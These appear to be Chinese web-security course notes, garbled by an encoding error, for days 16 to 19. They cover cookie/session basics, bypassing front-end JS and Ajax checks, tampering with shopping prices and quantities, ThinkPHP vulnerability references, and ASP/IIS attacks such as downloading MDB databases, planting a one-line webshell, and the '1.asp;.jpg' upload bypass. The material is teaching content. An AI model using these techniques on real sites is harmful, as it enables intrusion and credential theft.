<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie å’Œ Session æ˜¯ä¸¤ç§å¸¸è§çš„ Web åº”ç”¨ç¨‹åºçŠ¶æ€ç®¡ç†æœºåˆ¶ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¹‹é—´ä¿å­˜ç”¨æˆ·æ•°æ®å¹¶å®ç°ç”¨æˆ·èº«ä»½è®¤è¯ã€‚å®ƒä»¬çš„ä¸åŒç‚¹å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">1ã€å­˜å‚¨ä½ç½®ï¼šCookie ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¸­ï¼Œè€Œ Session ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚</span><br><span class="line"></span><br><span class="line">2ã€æ•°æ®å®‰å…¨æ€§ï¼šCookie ä¸­å­˜å‚¨çš„æ•°æ®å¯ä»¥è¢«å®¢æˆ·ç«¯ç¯¡æ”¹å’ŒæŸ¥çœ‹ï¼Œå› æ­¤éœ€è¦è¿›è¡ŒåŠ å¯†å¤„ç†æˆ–è€…è®¾ç½® HttpOnly å±æ€§æ¥é˜²æ­¢ XSS æ”»å‡»ï¼›Session ä¸­å­˜å‚¨çš„æ•°æ®åªæœ‰å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œå› æ­¤ç›¸å¯¹æ›´å®‰å…¨ã€‚</span><br><span class="line"></span><br><span class="line">3ã€å­˜å‚¨å®¹é‡ï¼šCookie çš„å­˜å‚¨å®¹é‡é€šå¸¸æ¯”è¾ƒå°ï¼Œä¸€èˆ¬é™åˆ¶åœ¨ 4KB å·¦å³ï¼›Session çš„å­˜å‚¨å®¹é‡ç›¸å¯¹æ›´å¤§ã€‚</span><br><span class="line"></span><br><span class="line">4ã€ç”Ÿå‘½å‘¨æœŸï¼šCookie å¯ä»¥è®¾ç½®ç”Ÿå‘½å‘¨æœŸï¼Œå¯ä»¥åœ¨æµè§ˆå™¨å…³é—­åä»ç„¶ä¿æŒä¸€æ®µæ—¶é—´ï¼›Session é»˜è®¤æƒ…å†µä¸‹åœ¨æµè§ˆå™¨å…³é—­åå°±ä¼šå¤±æ•ˆï¼Œæˆ–è€…ç­‰å¾…ä¸€å®šæ—¶é—´åè‡ªåŠ¨è¿‡æœŸã€‚</span><br><span class="line"></span><br><span class="line">5ã€åº”ç”¨åœºæ™¯ï¼šCookie ä¸»è¦ç”¨äºå®ç°æ— çŠ¶æ€çš„ HTTP åè®®ä¸‹çš„ç”¨æˆ·èº«ä»½éªŒè¯ã€è®°ä½å¯†ç ç­‰åŠŸèƒ½ï¼Œé€‚åˆäºåˆ†å¸ƒå¼ç³»ç»Ÿå’Œè´Ÿè½½å‡è¡¡ç¯å¢ƒï¼›Session ä¸»è¦ç”¨äºä¿å­˜ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Œé€‚åˆäºéœ€è¦ç»´æŠ¤ä¼šè¯çŠ¶æ€çš„åº”ç”¨åœºæ™¯ã€‚</span><br><span class="line"></span><br><span class="line">æ€»ä¹‹ï¼Œåœ¨é€‰æ‹© Cookie å’Œ Session è¿›è¡ŒçŠ¶æ€ç®¡ç†æ—¶ï¼Œéœ€è¦æ ¹æ®å…·ä½“çš„åº”ç”¨éœ€æ±‚å’Œå®‰å…¨æ€§è¦æ±‚è¿›è¡Œé€‰æ‹©ã€‚å¯¹äºæ•æ„Ÿæ•°æ®å’Œæ“ä½œï¼Œå»ºè®®é‡‡ç”¨ Session æ¥ç»´æŠ¤ä¼šè¯çŠ¶æ€ï¼Œå¹¶é‡‡å–ç›¸åº”çš„åŠ å¯†å’ŒéªŒè¯æªæ–½æ¥æé«˜æ•°æ®å®‰å…¨æ€§ï¼›å¯¹äºè¾ƒä¸ºç®€å•çš„ç”¨æˆ·èº«ä»½è®¤è¯å’ŒçŠ¶æ€ç®¡ç†ï¼Œå¯ä»¥ä½¿ç”¨ Cookie æ–¹ä¾¿å¿«æ·åœ°å®ç°ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h4><p>å°è¿ªåšå®¢-åå°ç™»å½•&amp;COOKIE&amp;SESSION<br>æœ¬åœ°é¶åœº-æŸCMSåå°ç™»å½•éªŒè¯COOKIEè„†å¼±<br>burpæŠ“åŒ…ä¿®æ”¹cookieä¿¡æ¯ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¡¥å……ï¼š</span><br><span class="line">åœ¨CTFæ¯”èµ›ä¸­ï¼ŒCookieç›¸å…³çš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œ ç‰¹åˆ«æ˜¯JWTéªŒè¯è¿™ä¸ªæ–¹é¢ï¼Œè¿˜æ˜¯å¾ˆé‡è¦çš„ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬16å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-JS-Ajax-å‰ç«¯é€»è¾‘-è´­ç‰©-ç™»å½•-ä¸Šä¼ "><a href="#ç¬¬16å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-JS-Ajax-å‰ç«¯é€»è¾‘-è´­ç‰©-ç™»å½•-ä¸Šä¼ " class="headerlink" title="ç¬¬16å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;JS-Ajax&amp;å‰ç«¯é€»è¾‘&amp;è´­ç‰©&amp;ç™»å½•&amp;ä¸Šä¼ "></a>ç¬¬16å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;JS-Ajax&amp;å‰ç«¯é€»è¾‘&amp;è´­ç‰©&amp;ç™»å½•&amp;ä¸Šä¼ </h1><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><h5 id="1ã€Jså‰ç«¯éªŒè¯-æ–‡ä»¶ä¸Šä¼ "><a href="#1ã€Jså‰ç«¯éªŒè¯-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="1ã€Jså‰ç«¯éªŒè¯-æ–‡ä»¶ä¸Šä¼ "></a>1ã€Jså‰ç«¯éªŒè¯-æ–‡ä»¶ä¸Šä¼ </h5><p>å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åè¿›è¡ŒéªŒè¯ï¼Œç¬¦åˆè¦æ±‚çš„æ‰èƒ½ä¸Šä¼ ï¼Œå¯ä»¥é€šè¿‡PHPæˆ–è€…JSä»£ç å®ç°ã€‚<br>ä¸¤ç§å»éªŒè¯çš„åŒºåˆ«ï¼š<br>PHPéªŒè¯çš„ä»£ç çœ‹ä¸åˆ°åªèƒ½é»‘ç›’æµ‹è¯•<br>JSéªŒè¯çš„ä»£ç çš„å¯ä»¥çœ‹åˆ°çš„ç™½ç›’æµ‹è¯•<br>JSç¦ç”¨å¯ä»¥ç»•è¿‡å‰ç«¯éªŒè¯</p>
<h5 id="2ã€Js-Ajaxä¼ é€’-ç™»å½•-çŠ¶æ€"><a href="#2ã€Js-Ajaxä¼ é€’-ç™»å½•-çŠ¶æ€" class="headerlink" title="2ã€Js-Ajaxä¼ é€’-ç™»å½•-çŠ¶æ€"></a>2ã€Js-Ajaxä¼ é€’-ç™»å½•-çŠ¶æ€</h5><blockquote>
<p>js ajax è¯·æ±‚-&gt;è¿”å›-&gt;è¯»å–è¿”å›çš„æ•°æ®-&gt;JS ajaxä»£ç è¿›è¡Œè§£æ-&gt;ç»“æœ<br>php è¯·æ±‚-&gt;è¿”å›-&gt;è¿”å›ç»“æœï¼ˆæœåŠ¡å™¨ä¸ä¼šç†ä¼šä½ è‡ªæ…°ï¼‰</p>
</blockquote>
<p>Ajaxæ¥æ”¶infocodeå‚æ•°åˆ¤æ–­æ˜¯å¦éªŒè¯æˆåŠŸã€‚å¯é€šè¿‡burpæŠ“åŒ…ä¿®æ”¹å‚æ•°ç»•è¿‡ç™»å½•éªŒè¯ã€‚</p>
<h5 id="3ã€JS-Ajaxä¼ é€’-è´­ç‰©-å‚æ•°"><a href="#3ã€JS-Ajaxä¼ é€’-è´­ç‰©-å‚æ•°" class="headerlink" title="3ã€JS-Ajaxä¼ é€’-è´­ç‰©-å‚æ•°"></a>3ã€JS-Ajaxä¼ é€’-è´­ç‰©-å‚æ•°</h5><p>æ¼”ç¤ºæ¡ˆä¾‹</p>
<h6 id="1ã€æ–‡ä»¶ä¸Šä¼ -ç±»å‹-è¿‡æ»¤"><a href="#1ã€æ–‡ä»¶ä¸Šä¼ -ç±»å‹-è¿‡æ»¤" class="headerlink" title="1ã€æ–‡ä»¶ä¸Šä¼ -ç±»å‹-è¿‡æ»¤"></a>1ã€æ–‡ä»¶ä¸Šä¼ -ç±»å‹-è¿‡æ»¤</h6><p>è®¾è®¡ï¼šé€šè¿‡JavaScriptè¿›è¡Œæ–‡ä»¶åç¼€ç­›é€‰éªŒè¯</p>
<h6 id="2ã€çŠ¶æ€å›æ˜¾-ç™»å½•-çŠ¶æ€ç "><a href="#2ã€çŠ¶æ€å›æ˜¾-ç™»å½•-çŠ¶æ€ç " class="headerlink" title="2ã€çŠ¶æ€å›æ˜¾-ç™»å½•-çŠ¶æ€ç "></a>2ã€çŠ¶æ€å›æ˜¾-ç™»å½•-çŠ¶æ€ç </h6><p>è®¾è®¡ï¼šé€šè¿‡Ajaxä¼ é€’æ•°æ®è¿›è¡Œç”¨æˆ·ç™»å½•éªŒè¯</p>
<h6 id="3ã€å‚æ•°ä¿®æ”¹-è´­ç‰©ä¸€å‚æ•°ä¿®æ”¹"><a href="#3ã€å‚æ•°ä¿®æ”¹-è´­ç‰©ä¸€å‚æ•°ä¿®æ”¹" class="headerlink" title="3ã€å‚æ•°ä¿®æ”¹-è´­ç‰©ä¸€å‚æ•°ä¿®æ”¹"></a>3ã€å‚æ•°ä¿®æ”¹-è´­ç‰©ä¸€å‚æ•°ä¿®æ”¹</h6><p>è®¾è®¡ï¼šé€šè¿‡Ajaxä¼ é€’æ•°æ®è¿›è¡Œè´­ç‰©éªŒè¯</p>
<p>è®¾è®¡1ï¼šå•†å“ä»·æ ¼ä»¥å‰ç«¯è®¾ç½®ä»·æ ¼ä¸ºå‡†ï¼Œæ•°æ®æ¥æ”¶ä»·æ ¼åè¿ç®—<br>é€šè¿‡ä¿®æ”¹å‰ç«¯ä¼ é€’çš„ä»·æ ¼å’Œæ•°é‡ç»•è¿‡<br>è®¾è®¡2ï¼šå•†å“ä»·æ ¼ä»¥æ•°æ®åº“å¯¹åº”ä»·æ ¼ä¸ºå‡†ï¼Œæ•°æ®æ¥æ”¶ä»·æ ¼åè¿ç®—<br>è™½ç„¶ä»·æ ¼å–è‡ªæ•°æ®åº“ï¼Œä½†æ˜¯åˆ¤æ–­è¿˜æ˜¯ç”±JSä»£ç åˆ¤æ–­ï¼Œä¿®æ”¹ä»·æ ¼ä»å¯ç»•è¿‡<br>è®¾è®¡3ï¼šå•†å“ä»·æ ¼ä»¥æ•°æ®åº“å¯¹åº”ä»·æ ¼ä¸ºå‡†ï¼Œæ•°æ®åªæ¥å—æ•°é‡åè¿ç®—<br>æ­¤æ—¶åˆ¤æ–­ä¹‹å‰ä¹Ÿä¼šä»æ•°æ®åº“å–ä»·æ ¼ï¼Œä½†æ˜¯å› ä¸ºæ•°é‡æ˜¯ç”±jsä¼ é€’çš„ï¼Œä¿®æ”¹æ•°é‡æ¢æˆå°æ•°æˆ–è€…è´Ÿæ•°å¯ä»¥å®ç°ç»•è¿‡<br>è®¾è®¡4ï¼šå•†å“ä»·æ ¼ä»¥æ•°æ®åº“å¯¹åº”ä»·æ ¼ä¸ºå‡†ï¼Œæ•°æ®åªæ¥å—æ•°é‡ååšè¿‡æ»¤è¿ç®—</p>
<h1 id="ç¬¬17å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-TPæ¡†æ¶-è·¯ç”±è®¿é—®-å®‰å…¨å†™æ³•-å†å²æ¼æ´"><a href="#ç¬¬17å¤©-PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®-TPæ¡†æ¶-è·¯ç”±è®¿é—®-å®‰å…¨å†™æ³•-å†å²æ¼æ´" class="headerlink" title="ç¬¬17å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;TPæ¡†æ¶&amp;è·¯ç”±è®¿é—®&amp;å®‰å…¨å†™æ³•&amp;å†å²æ¼æ´"></a>ç¬¬17å¤© PHPå¼€å‘-ä¸ªäººåšå®¢é¡¹ç›®&amp;TPæ¡†æ¶&amp;è·¯ç”±è®¿é—®&amp;å®‰å…¨å†™æ³•&amp;å†å²æ¼æ´</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-3"><a href="#çŸ¥è¯†ç‚¹ï¼š-3" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€åŸºäºTPæ¡†æ¶å…¥é—¨å®‰è£…æ­å»ºä½¿ç”¨<br>2ã€åŸºäºTPæ¡†æ¶å†…ç½®å®‰å…¨å†™æ³•è¯„ä¼°<br>3ã€åŸºäºTPæ¡†æ¶å®ä¾‹æºç å®‰å…¨æ€§è¯„ä¼°</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹</p>
<ul>
<li>å…¥é—¨-ç®€å•äº†è§£-å®‰è£…&amp;è°ƒè¯•&amp;å…¥å£&amp;é…ç½®</li>
<li>ä½¿ç”¨-è·¯ç”±è®¿é—®æ§åˆ¶å™¨&amp;å¯¹è±¡&amp;å‡½æ•°&amp;å‚æ•°</li>
<li>å®‰å…¨-SQLæ³¨å…¥-ä¸å®‰å…¨å†™æ³•å¯¹æ¯”å®˜æ–¹å†™æ³•</li>
<li>å®‰å…¨-RCEæ‰§è¡Œ-å†å²å®‰å…¨æ¼æ´å¯¹æ¯”æ¡†æ¶ç‰ˆæœ¬</li>
<li>å®ä¾‹-CMSæºç -EyouCMS&amp;Fastadmin&amp;YFCMF</li>
</ul>
<p>#å®‰å…¨-$QLæ³¨å…¥-ä¸å®‰å…¨å†™æ³•å¯¹æ¯”å®˜æ–¹å†™æ³•<br>1ã€å‚æ•°è¿‡æ»¤<br>2ã€å†…ç½®è¿‡æ»¤<br>#å®‰å…¨-RCEæ‰§è¡Œ-å†å²å®‰å…¨æ¼æ´å¯¹æ¯”æ¡†æ¶ç‰ˆæœ¬<br>1ã€æ¡†æ¶ç‰ˆæœ¬æ¼æ´<br>2ã€æ¡†æ¶å†™æ³•å®‰å…¨<br>3ã€é»‘ç›’ç™½ç›’çœ‹ç‰ˆæœ¬<br>#å®ä¾‹-CMS:æºç -EyouCMS&amp;Fastadmin&amp;YFCMF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdminLTEåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">1ayuiåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui,adminåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMSåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">tpadmin,åå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">snakeåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHPåå°ç®¡ç†ç³»ç»Ÿ</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a>          thinkphpæ¡†æ¶çš„æ‰€æœ‰æ¼æ´æ•´åˆ</p>
<p><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a>   æ›´å…¨é¢æ›´æ–°çš„è®²è§£äº†thinkphpçš„å„ç§æ¼æ´</p>
<p>ThinkPHP5.0åœ¨æ²¡æœ‰å¯ç”¨è·¯ç”±çš„æƒ…å†µä¸‹å…¸å‹çš„URLè®¿é—®è§„ä¾§æ˜¯ï¼š<br><a href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/]">http://serverName/index.phpï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/]</a><br>thinkphpæ¥æ”¶å˜é‡çš„å†™æ³•<br>input(â€˜?get.idâ€™);<br>input(â€˜?post.nameâ€™);é€šè¿‡thinkphpå†…ç½®çš„å†™æ³•å¯ä»¥è¿‡æ»¤æ³¨å…¥è¯­å¥ã€‚ï¼ˆå†…ç½®è¿‡æ»¤ï¼‰<br>thinkphpæŸ¥è¯¢æ•°æ®åº“è¯­æ³•<br>Db::table(â€˜think userâ€™)-&gt;where(â€˜statusâ€™,1)-&gt;selectï¼ˆï¼‰;ï¼ˆå³ä½¿æ•°æ®æ¥æ”¶æ²¡æœ‰è¿‡æ»¤ï¼Œå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢çš„æ—¶å€™ä»è¿›è¡Œè¿‡æ»¤ï¼Œå†…ç½®è¿‡æ»¤ï¼‰<br>appplicaton&#x2F;config.phpé…ç½®æ–‡ä»¶ä¸­å«æœ‰app_debugå’Œapp_traceä¸¤ä¸ªå­—æ®µï¼Œå¼€å¯ç”¨æ¥è°ƒè¯•éªŒè¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨åˆ°TPæ¡†æ¶æ‰¾æ¼æ´</span><br><span class="line">1ã€çœ‹å†™æ³•</span><br><span class="line">2ã€çœ‹å†å²æ¼æ´-&gt;ç‰ˆæœ¬</span><br><span class="line">ç‰ˆæœ¬è·å–çŸ¥é“ï¼Ÿ</span><br><span class="line">é»‘ç›’ï¼š</span><br><span class="line">åˆ¤æ–­æ˜¯ä¸æ˜¯tpè¿”å›æ•°æ®åŒ…</span><br><span class="line">æ€ä¹ˆçœ‹ç‰ˆæœ¬-æŠ¥é”™</span><br><span class="line">ç»éªŒï¼šURLåœ°å€</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬18å¤©ï¼šWEBæ”»é˜²-ASPå®‰å…¨-MDBä¸‹è½½æ¤å…¥-IISçŸ­æ–‡ä»¶å-å†™æƒé™-è§£æ"><a href="#ç¬¬18å¤©ï¼šWEBæ”»é˜²-ASPå®‰å…¨-MDBä¸‹è½½æ¤å…¥-IISçŸ­æ–‡ä»¶å-å†™æƒé™-è§£æ" class="headerlink" title="ç¬¬18å¤©ï¼šWEBæ”»é˜²-ASPå®‰å…¨&amp;MDBä¸‹è½½æ¤å…¥&amp;IISçŸ­æ–‡ä»¶å&amp;å†™æƒé™&amp;è§£æ"></a>ç¬¬18å¤©ï¼šWEBæ”»é˜²-ASPå®‰å…¨&amp;MDBä¸‹è½½æ¤å…¥&amp;IISçŸ­æ–‡ä»¶å&amp;å†™æƒé™&amp;è§£æ</h1><p>è¿™ä¸ªçŸ¥è¯†ç‚¹å…¶å®å·®ä¸å¤šç°åœ¨ä¹Ÿå¯ä»¥ç›´æ¥è·³è¿‡äº†ï¼Œåœ¨ç°åœ¨è¿™ä¸ªæ—¶å€™å·²ç»å¾ˆå°‘æœ‰äººå»ä½¿ç”¨aspæ­å»ºç½‘ç«™äº†ï¼Œä¸»æµçš„è¿˜å¾—æ˜¯javaã€pythonä»€ä¹ˆçš„ï¼Œç”šè‡³phpå¯èƒ½éƒ½æ¯”aspä¼šæ›´å¤šäº†ã€‚</p>
<h4 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>1ã€ASPç¯å¢ƒæ­å»ºç»„åˆ<br>2ã€ASP-æ•°æ®åº“ä¸‹è½½&amp;æ¤å…¥<br>3ã€IIS-çŸ­æ–‡ä»¶&amp;è§£æ&amp;å†™æƒé™</p>
<p><a href="https://so.csdn.net/so/search?q=WEB%E5%AE%89%E5%85%A8&spm=1001.2101.3001.7020">WEBå®‰å…¨</a>æ”»é˜²ï¼š<br>1ã€Weoæºç <br>2ã€å¼€å‘è¯­è¨€<br>3ã€ä¸­é—´ä»¶å¹³å°<br>4ã€<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">æ•°æ®åº“ç±»å‹</a><br>4ã€ç¬¬ä¸‰æ–¹æ’ä»¶æˆ–è½¯ä»¶</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-1"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-1" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h6 id="ASP-æ•°æ®åº“-MDBé»˜è®¤ä¸‹è½½"><a href="#ASP-æ•°æ®åº“-MDBé»˜è®¤ä¸‹è½½" class="headerlink" title="ASP-æ•°æ®åº“-MDBé»˜è®¤ä¸‹è½½"></a>ASP-æ•°æ®åº“-MDBé»˜è®¤ä¸‹è½½</h6><p>å¸¸ç”¨ç»„åˆï¼šwindows+ISS+ASP+Accessï¼ˆsqlserverï¼‰<br>åŸç†ï¼šaccessæ•°æ®åº“ä¸€èˆ¬åç¼€åmdbï¼ˆä¸‹è½½ï¼‰asp asa(å¯ä»¥è¢«æ‰§è¡Œ)<br>mdbæ–‡ä»¶ä»–åœ¨ç½‘ç«™ç›®å½•ä¸‹é»˜è®¤æ•°æ®åº“é…ç½®ï¼ˆdatabase&#x2F;powereay2006.mdbï¼‰æˆ–è€…é€šè¿‡æ‰«æç›®å½•å¾—åˆ°<br>æ€è·¯ï¼šå¦‚æœæˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ•°æ®åº“çš„åœ°å€ï¼Œå°è¯•å¯ä»¥ä¸‹è½½è·å–æ•°æ®åº“æ–‡ä»¶ï¼Œè·å–å½“å‰ç®¡ç†å‘˜å¸å·å¯†ç ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/be974f59bf0db22217dce306e355ddd9--17d0--image-20240404165012897.png" alt="image-20240404165012897"></p>
<p>ç›´æ¥å°±å¯ä»¥åœ¨æ•°æ®åº“é‡Œé¢å»æ‰¾åˆ°è‡ªå·±æƒ³è¦çš„ä¿¡æ¯</p>
<h6 id="ASP-æ•°æ®åº“-ASPåé—¨æ¤å…¥è¿æ¥"><a href="#ASP-æ•°æ®åº“-ASPåé—¨æ¤å…¥è¿æ¥" class="headerlink" title="ASP-æ•°æ®åº“-ASPåé—¨æ¤å…¥è¿æ¥"></a>ASP-æ•°æ®åº“-ASPåé—¨æ¤å…¥è¿æ¥</h6><p>æµç¨‹ï¼šç•™è¨€æ¿å†™å…¥ä¸€å¥è¯æœ¨é©¬â€“èœåˆ€è¿æ¥æ•°æ®åº“åœ°å€<br>åŸç†ï¼šç½‘ç«™å¼€å¯äº†aspè§£æï¼Œç›´æ¥è®¿é—®æ•°æ®åº“æ–‡ä»¶ä¼šè¿”å›ä¿¡æ¯ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬åè¿›è¡Œè¿æ¥<br>1ã€åœ¨ç•™è¨€æ¿å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>2ã€ä½¿ç”¨shellç®¡ç†å·¥å…·è¿æ¥</p>
<h6 id="ASP-ä¸­é—´ä»¶-IISçŸ­æ–‡ä»¶åæ¢é’ˆå®‰å…¨æ¼æ´"><a href="#ASP-ä¸­é—´ä»¶-IISçŸ­æ–‡ä»¶åæ¢é’ˆå®‰å…¨æ¼æ´" class="headerlink" title="ASP-ä¸­é—´ä»¶-IISçŸ­æ–‡ä»¶åæ¢é’ˆå®‰å…¨æ¼æ´"></a>ASP-ä¸­é—´ä»¶-IISçŸ­æ–‡ä»¶åæ¢é’ˆå®‰å…¨æ¼æ´</h6><p>åŸç†ï¼šWindowsç³»ç»Ÿä¸ºäº†å…¼å®¹16ä½MS-DOSç¨‹åºï¼Œä¸ºæ–‡ä»¶åè¾ƒé•¿çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ç”Ÿæˆäº†å¯¹åº”çš„Windows 8.3çŸ­æ–‡ä»¶åã€‚æ¯”å¦‚æ–‡ä»¶ådirect~1.aspä¸­é—´æœ‰ä¸€ä¸ªæ³¢æµªå·ï¼Œè¿™ç§å°±æ˜¯çŸ­æ–‡ä»¶åäº†ã€‚<br>ä½¿ç”¨è„šæœ¬æ‰«æç½‘ç«™ç›®å½•é€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆä¸åŒäºä½¿ç”¨å­—å…¸æ‰«æï¼‰<br>å‚è€ƒè¿æ¥ï¼š<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
<h6 id="ASP-ä¸­é—´ä»¶IISæ–‡ä»¶ä¸Šä¼ è§£æ-å®‰å…¨æ¼æ´"><a href="#ASP-ä¸­é—´ä»¶IISæ–‡ä»¶ä¸Šä¼ è§£æ-å®‰å…¨æ¼æ´" class="headerlink" title="ASP-ä¸­é—´ä»¶IISæ–‡ä»¶ä¸Šä¼ è§£æ-å®‰å…¨æ¼æ´"></a>ASP-ä¸­é—´ä»¶IISæ–‡ä»¶ä¸Šä¼ è§£æ-å®‰å…¨æ¼æ´</h6><p>æµç¨‹ï¼šå‘ç°ç½‘ç«™å­˜åœ¨ä¸Šä¼ ç‚¹â€“ä¸Šä¼ aspæœ¨é©¬â€“è‹¥å­˜åœ¨æ–‡ä»¶åç›‘æµ‹é€šè¿‡ä¿®æ”¹æ–‡ä»¶ç±»å‹ç»•è¿‡æ£€æµ‹â€“shellå·¥å…·è¿æ¥<br>ä¾‹ï¼š1.jpgæ–‡ä»¶æ— æ³•è§£æï¼Œä¿®æ”¹ä¸º1.asp;.jpgå³å¯ç»•è¿‡ã€‚æˆ–è€…1.jpgæ–‡ä»¶æ”¾åœ¨a.aspæ–‡ä»¶ä¸‹ä¹Ÿå¯è¿›è¡Œè§£æ<br>ASP-ä¸­é—´ä»¶-IISé…ç½®ç›®å½•è¯»å†™-å®‰å…¨é…ç½®</p>
<h6 id="IS-putå†™å…¥æ¼æ´"><a href="#IS-putå†™å…¥æ¼æ´" class="headerlink" title="IS putå†™å…¥æ¼æ´"></a>IS putå†™å…¥æ¼æ´</h6><p>å½“ç½‘ç«™ä¸ºIIS6.0ä¸”å¼€å¯å†™å…¥æƒé™ã€å¼€å¯webæœåŠ¡æ‹“å±•WebDAVåˆ™å­˜åœ¨æ­¤æ¼æ´</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/song123sh/article/details/123539837">https://blog.csdn.net/song123sh/article/details/123539837</a></p>
<h1 id="ç¬¬19å¤©WEBæ”»é˜²-NETé¡¹ç›®8-DLLåç¼–è¯‘-æœªæˆæƒè®¿é—®-é…ç½®è°ƒè¯•æŠ¥é”™"><a href="#ç¬¬19å¤©WEBæ”»é˜²-NETé¡¹ç›®8-DLLåç¼–è¯‘-æœªæˆæƒè®¿é—®-é…ç½®è°ƒè¯•æŠ¥é”™" class="headerlink" title="ç¬¬19å¤©WEBæ”»é˜²-.NETé¡¹ç›®8&amp;DLLåç¼–è¯‘&amp;æœªæˆæƒè®¿é—®&amp;é…ç½®è°ƒè¯•æŠ¥é”™"></a>ç¬¬19å¤©WEBæ”»é˜²-.NETé¡¹ç›®8&amp;DLLåç¼–è¯‘&amp;æœªæˆæƒè®¿é—®&amp;é…ç½®è°ƒè¯•æŠ¥é”™</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-4"><a href="#çŸ¥è¯†ç‚¹ï¼š-4" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€,NETé…ç½®è°ƒè¯•-ä¿¡æ¯æ³„éœ²<br>2ã€.NETæºç åç¼–è¯‘-DLLåç¼–è¯‘<br>3ã€.NETå¸¸è§å®‰å…¨é—®é¢˜-æœªæˆæƒè®¿é—®</p>
